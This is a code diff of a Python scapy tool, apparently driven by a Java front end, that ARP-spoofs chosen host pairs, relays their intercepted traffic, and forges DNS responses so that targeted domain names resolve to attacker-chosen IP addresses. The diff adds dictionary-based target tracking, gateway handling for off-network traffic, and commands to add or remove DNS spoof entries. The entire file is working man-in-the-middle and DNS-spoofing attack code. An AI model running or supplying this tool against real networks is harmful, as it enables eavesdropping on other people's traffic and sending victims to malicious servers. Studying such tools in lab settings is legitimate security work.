@@ -4,90 +4,114 @@ import threading
 import time
 from scapy.all import IP, Ether, send, sniff, getmacbyip, conf, get_if_hwaddr, ARP, sendp, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, get_if_addr
 import copy
-from http.server import HTTPServer, BaseHTTPRequestHandler
 
-targets = []
+targets = dict()
+targets_lock = threading.Lock()
+
+dns_targets = dict()
+dns_targets_lock = threading.Lock()
 is_running = True
-lock = threading.Lock()
 
-dns_targets = ["google.com"]
-
-attacker_mac = get_if_hwaddr(conf.iface)
+attacker_mac = get_if_hwaddr(conf.iface).lower()
 attacker_ip = get_if_addr(conf.iface)
-# Cache to store resolved IP-MAC pairs
-mac_cache = {}
+
+# TODO: How long will the key value pairs stored in here hold? When are they expired and should we check again?
+mac_cache = {}  # Cache to store resolved IP-MAC pairs
+
+spoof_cooldown_in_sec = 3
 
 
+def get_right_order(val1: str, val2: str):
+    if val1 < val2:
+        return val1, val2
+    else:
+        return val2, val1
+
+
+# Prints a json info message that java can pick up and display to the logger.
 def log_info(msg):
     print(json.dumps({"type": "info", "info": msg}), flush=True)
 
 
+# Prints a json error message that java can pick up and display to the logger.
 def log_error(msg):
     print(json.dumps({"type": "error", "error": msg}), flush=True)
 
 
-def send_packet_info(packet):
-    if packet.haslayer(Ether):
-        src = packet[Ether].src.lower()
-        dst = packet[Ether].dst.lower()
-        with lock:
-            for ip1, ip2 in targets:
-                mac1 = mac_cache.get(ip1)
-                mac2 = mac_cache.get(ip2)
+# Returns the router's IP if the given ip is not on the local network, otherwise returns input as output
+def router_if_offnet(ip: str) -> str:
+    _, _, gateway = conf.route.route(ip)[:3]
+    return ip if gateway == "0.0.0.0" else gateway
 
-                if mac1 is None or mac2 is None:
-                    # Skip pairs with missing MACs
-                    continue
 
-                # Check if destination mac address is the user's mac address:
-                if dst == attacker_mac:
+def handle_incoming_packet(packet):
+    if not packet.haslayer(Ether) or not packet.haslayer(IP):
+        return
+    src_ip = packet[IP].src  # Could be an ip outside or inside the network
+    dst_mac = packet[Ether].dst.lower()  # Most probably just the attacker's mac address
+    dst_ip = packet[IP].dst  # Could be an ip outside or inside the network
 
-                    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
-                        domain = packet[DNSQR].qname.decode().rstrip('.').lower()
-                        if any(domain.endswith(target) for target in dns_targets):
-                            newpacket = copy.deepcopy(packet)
-                            ip = IP(src=newpacket[IP].dst, dst=newpacket[IP].src)  # DNS server IP to client IP
-                            udp = UDP(sport=53, dport=newpacket[UDP].sport)   # Sport = 53 (DNS), Dport = client's source port
+    # Only accept packages that come in
+    if not dst_mac == attacker_mac:
+        return
 
-                            dns = DNS(
-                                id=newpacket[DNS].id,         # Transaction ID (must match the query)
-                                qr=1,              # This is a response
-                                aa=1,              # Authoritative Answer
-                                qdcount=1,
-                                ancount=1,
-                                qd=newpacket[DNS].qd,
-                                an=DNSRR(rrname=domain, ttl=300, rdata='34.36.121.47')
-                            )
+    # router_if_offnet changes ip address to router ip address if the ip address comes from somewhere
+    # outside the local network
+    src_target_ip = router_if_offnet(src_ip)
+    dst_target_ip = router_if_offnet(dst_ip)
+    ip1, ip2 = get_right_order(src_target_ip, dst_target_ip)
+    with targets_lock:
+        holds = targets.get(ip1) == ip2
+    if holds:
+        # Update to the actual destination mac address
+        dst_mac = get_mac(dst_target_ip)
+        if dst_mac is None:
+            return
 
-                            newpacket = ip / udp / dns
-                            send(newpacket, iface=conf.iface, verbose=False)
+        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
+            domain = packet[DNSQR].qname
+            with dns_targets_lock:
+                is_domain_in_targets = domain.decode().rstrip('.').lower() in dns_targets
+            if is_domain_in_targets:
+                dns_spoof(packet, domain)
+        else:
+            redirect_packet(dst_mac, packet)
 
-                            break
-                        else:
+        if packet.haslayer(DNS):
+            print_packet_in_json(packet)
 
-                            if src == mac1:
-                                print_package_in_json(packet)  # Let java know of the packet
-                                redirect_package(mac1, packet)
-                                break
 
-                            elif src == mac2:
-                                print_package_in_json(packet)  # Let java know of the packet
-                                redirect_package(mac2, packet)
-                                break
-                    else:
-                        if src == mac1:
-                            print_package_in_json(packet)  # Let java know of the packet
-                            redirect_package(mac2, packet)
-                            break
-                        elif src == mac2:
-                            print_package_in_json(packet)  # Let java know of the packet
-                            redirect_package(mac1, packet)
-                            break
+def dns_spoof(packet, domain):
+    with dns_targets_lock:
+        redirect_ip = dns_targets.get(domain.decode().rstrip('.').lower())
+    if redirect_ip is None:
+        return
+
+    ether = Ether(
+        src=attacker_mac.lower(),
+        dst=packet[Ether].src
+    )
+    ip = IP(src=packet[IP].dst,
+            dst=packet[IP].src)
+    udp = UDP(sport=53, dport=packet[UDP].sport)
+    dns = DNS(
+        id=packet[DNS].id,
+        qr=1, aa=1, qdcount=1, qd=packet[DNS].qd,
+        ancount=1,
+        an=DNSRR(
+            rrname=domain,
+            ttl=300,
+            rdata=redirect_ip
+        )
+    )
+
+    forged = ether / ip / udp / dns
+    sendp(forged, iface=conf.iface, verbose=False)
 
 
 # Creates a new packet with the attacker's mac address
-# as source and the specified destination as destination
-def redirect_package(destination, packet):
+# as source and the specified destination as destination and also sends it.
+def redirect_packet(destination, packet):
     new_packet = copy.deepcopy(packet)
     new_packet[Ether].src = attacker_mac.lower()
     new_packet[Ether].dst = destination
@@ -95,7 +119,7 @@ def redirect_package(destination, packet):
 
 
 # Nicely divides up the packet and writes it in json format and lets java know
-def print_package_in_json(packet):
+def print_packet_in_json(packet):
     info = {
         "type": "packet",
         "summary": packet.summary(),
@@ -103,34 +127,37 @@ def print_package_in_json(packet):
     print(json.dumps(info), flush=True)
 
 
+# Continuously spoof every entry in targets
 def spoof_loop():
     while is_running:
-        with lock:
-            for ip1, ip2 in targets:
+        with targets_lock:
+            for ip1, ip2 in targets.items():
                 spoof(ip1, ip2)
-                spoof(ip2, ip1)
-        time.sleep(2)
+        time.sleep(spoof_cooldown_in_sec)
 
 
+# Tries to get the mac address by retrieving it from the mac cache or by sending an ARP request
 def get_mac(ip):
     """Retrieve MAC address for an IP address, using cache if available."""
     if ip not in mac_cache:
         # Resolve MAC address if not cached
-        mac = getmacbyip(ip).lower()
+        mac = getmacbyip(ip)
         if mac:
-            mac_cache[ip] = mac
+            mac_cache[ip] = mac.lower()
         else:
             log_error(f"Failed to resolve MAC address for IP: {ip}")
             return None
     return mac_cache[ip]
 
 
+# Apply a spoof in both directions: Let ip1 with mac1 think that the attacker's mac address belongs to ip2 and
+# let ip2 with mac2 think that the attacker's mac address belongs to ip1
 def spoof(ip1, ip2):
     mac1 = get_mac(ip1)
     mac2 = get_mac(ip2)
 
     if mac1 is None or mac2 is None:
-        log_error(f"Failed to resolve MAC address for IPs: {ip1} or {ip2}")
+        log_error(f"Failed to spoof {ip1} and {ip2} because one or more mac address could not be resolved")
         return
 
     # Create the ARP spoof packet
@@ -144,8 +171,9 @@ def spoof(ip1, ip2):
     send(packet, verbose=False)
 
 
+# Constantly sniff packets and pass them to the send_packet_info() function
 def sniff_thread():
-    sniff(prn=send_packet_info, store=0)
+    sniff(prn=handle_incoming_packet, store=0)
 
 
 def handle_command(command):
@@ -155,22 +183,34 @@ def handle_command(command):
         action = data.get("action")
 
         if action == "add_target":
-            ip1, ip2 = data["ip1"], data["ip2"]
-            with lock:
-                if (ip1, ip2) not in targets:
-                    targets.append((ip1, ip2))
+            ip1, ip2 = get_right_order(data["ip1"], data["ip2"])
+            with targets_lock:
+                if not (targets.get(ip1) == ip2):
+                    targets[ip1] = ip2
                     log_info(f"Added spoofing pair: {ip1} <-> {ip2}")
 
         elif action == "remove_target":
-            ip1, ip2 = data["ip1"], data["ip2"]
-            with lock:
-                if (ip1, ip2) in targets:
-                    targets.remove((ip1, ip2))
+            ip1, ip2 = get_right_order(data["ip1"], data["ip2"])
+            with targets_lock:
+                if targets.get(ip1) == ip2:
+                    del targets[ip1]
                     log_info(f"Removed spoofing pair: {ip1} <-> {ip2}")
 
         elif action == "shutdown":
             is_running = False
             log_info("Shutting down spoofer...")
+
+        elif action == "add_dns_target":
+            domainname, ip = data["domainname"], data["ip"]
+            with dns_targets_lock:
+                dns_targets[domainname] = ip
+                log_info(f"Added dns spoof entry ({domainname}, {ip})")
+
+        elif action == "remove_dns_target":
+            domainname = data["domainname"]
+            with dns_targets_lock:
+                del dns_targets[domainname]
+                log_info(f"Removed dns spoof entry with domainname {domainname}")
 
     except Exception as e:
         log_error(f"Failed to handle command: {str(e)}")
@@ -179,9 +219,10 @@ def handle_command(command):
 def main():
     log_info("Spoofer started.")
 
+    # A thread that continuously sends ARP responses to the targets
     threading.Thread(target=spoof_loop, daemon=True).start()
+
     threading.Thread(target=sniff_thread, daemon=True).start()
-    # threading.Thread(target=run_spoofed_http_server, daemon=True).start()
 
     for line in sys.stdin:
         handle_command(line.strip())
